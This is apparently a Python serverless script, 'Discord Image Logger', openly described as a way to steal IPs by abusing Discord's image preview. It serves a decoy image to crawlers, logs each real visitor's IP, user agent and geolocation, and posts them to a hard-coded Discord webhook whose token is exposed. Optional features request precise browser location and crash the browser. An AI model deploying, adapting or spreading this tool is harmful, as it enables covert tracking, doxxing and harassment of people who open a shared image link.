# Discord Image Logger - Vercel Serverless Version
# By DeKrypt | Adapted for Vercel
# https://github.com/dekrypted

from http import HTTPStatus
import json
from urllib import parse
import traceback
import requests
import base64
import httpagentparser
import os

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1477989584616030230/BBk-33WX3UdwmG8w1jUlGAN81Hlxr4ciDKIxRctQ6sJmSZBjDgXefoogSpFk0tXm1u7J",
    "image": "https://i.pinimg.com/1200x/c0/ee/be/c0eebec3d3b417a404182f6fed62f457.jpg",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Kenjaku",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip or ip.startswith(blacklistedIPs):
        return None
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                })
            except:
                pass
        return None

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {"proxy": False, "hosting": False, "isp": "Unknown", "as": "Unknown", 
                "country": "Unknown", "regionName": "Unknown", "city": "Unknown",
                "lat": 0, "lon": 0, "timezone": "UTC/Unknown", "mobile": False}
    
    if info.get("proxy", False):
        if config["vpnCheck"] == 2:
            return None
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting", False):
        if config["antiBot"] == 4:
            if info.get("proxy", False):
                pass
            else:
                return None
        if config["antiBot"] == 3:
            return None
        if config["antiBot"] == 2:
            if info.get("proxy", False):
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', 0)) + ', ' + str(info.get('lon', 0)) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'UTC/Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', '') else info.get('timezone', 'Unknown')}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
{useragent}
                """,
            }
        ],
    }
    
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed, timeout=5)
    except:
        pass
    
    return info

# Loading image binary
loading_image = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def lambda_handler(event, context):
    """Vercel serverless function handler"""
    try:
        # Get request information
        headers = event.get('headers', {})
        query_params = event.get('queryStringParameters', {}) or {}
        
        # Get client IP (handles various proxy headers)
        ip = (headers.get('x-forwarded-for', '').split(',')[0].strip() or 
              headers.get('x-real-ip', '') or 
              '0.0.0.0')
        
        user_agent = headers.get('user-agent', '')
        path = event.get('path', '/')
        
        # Parse query parameters
        if config["imageArgument"]:
            if query_params.get('url') or query_params.get('id'):
                try:
                    url_param = query_params.get('url') or query_params.get('id')
                    url = base64.b64decode(url_param.encode()).decode()
                except:
                    url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]

        # Check if it's a bot/Discord crawler
        is_bot = botCheck(ip, user_agent)
        
        if is_bot:
            # Handle Discord crawler - show loading image
            if config["buggedImage"]:
                return {
                    'statusCode': 200,
                    'headers': {
                        'Content-Type': 'image/jpeg',
                        'Cache-Control': 'no-cache, no-store, must-revalidate'
                    },
                    'body': base64.b64encode(loading_image).decode('utf-8'),
                    'isBase64Encoded': True
                }
            else:
                return {
                    'statusCode': 302,
                    'headers': {
                        'Location': url,
                        'Cache-Control': 'no-cache, no-store, must-revalidate'
                    }
                }
        
        # Handle regular users
        # Generate the HTML content
        html_content = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {{
            margin: 0;
            padding: 0;
            overflow: hidden;
            background-color: #000;
        }}
        .img-container {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-image: url('{url}');
            background-position: center center;
            background-repeat: no-repeat;
            background-size: contain;
            background-color: #000;
        }}
    </style>
</head>
<body>
    <div class="img-container"></div>
'''

        # Add geolocation script if enabled
        if config["accurateLocation"]:
            html_content += '''
    <script>
        var currenturl = window.location.href;
        if (!currenturl.includes("g=")) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function (coords) {
                    if (currenturl.includes("?")) {
                        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
                    } else {
                        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
                    }
                    location.replace(currenturl);
                });
            }
        }
    </script>
'''

        # Add crash browser script if enabled
        if config["crashBrowser"]:
            html_content += '''
    <script>
        setTimeout(function() {
            for (var i = 69420; i == i; i *= i) {
                console.log(i);
            }
        }, 100);
    </script>
'''

        # Add redirect if enabled
        if config["redirect"]["redirect"]:
            html_content = f'''<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url={config['redirect']['page']}">
</head>
<body>
    <p>Redirecting...</p>
</body>
</html>'''

        html_content += '''
</body>
</html>'''

        # Add custom message if enabled
        if config["message"]["doMessage"] and not config["redirect"]["redirect"]:
            message = config["message"]["message"]
            if config["message"]["richMessage"]:
                result = makeReport(ip, user_agent, endpoint=path.split("?")[0], url=url)
                if result:
                    message = message.replace("{ip}", ip)
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", 0)))
                    message = message.replace("{long}", str(result.get("lon", 0)))
                    message = message.replace("{timezone}", result.get("timezone", "UTC/Unknown"))
                    message = message.replace("{mobile}", str(result.get("mobile", False)))
                    message = message.replace("{vpn}", str(result.get("proxy", False)))
                    message = message.replace("{bot}", str(result.get("hosting", False)))
                    os_name, browser = httpagentparser.simple_detect(user_agent) if user_agent else ("Unknown", "Unknown")
                    message = message.replace("{browser}", browser)
                    message = message.replace("{os}", os_name)
            html_content = f'''<!DOCTYPE html>
<html>
<head>
    <title>Image Logger</title>
</head>
<body>
    <pre>{message}</pre>
</body>
</html>'''

        # Make the report
        if query_params.get('g') and config["accurateLocation"]:
            try:
                location = base64.b64decode(query_params.get('g').encode()).decode()
                makeReport(ip, user_agent, location, path.split("?")[0], url=url)
            except:
                makeReport(ip, user_agent, endpoint=path.split("?")[0], url=url)
        else:
            makeReport(ip, user_agent, endpoint=path.split("?")[0], url=url)

        return {
            'statusCode': 200,
            'headers': {
                'Content-Type': 'text/html',
                'Cache-Control': 'no-cache, no-store, must-revalidate'
            },
            'body': html_content
        }

    except Exception as e:
        error_msg = traceback.format_exc()
        reportError(error_msg)
        
        return {
            'statusCode': 500,
            'headers': {
                'Content-Type': 'text/html'
            },
            'body': '<h1>500 - Internal Server Error</h1><p>Please check your Discord webhook for error details.</p>'
        }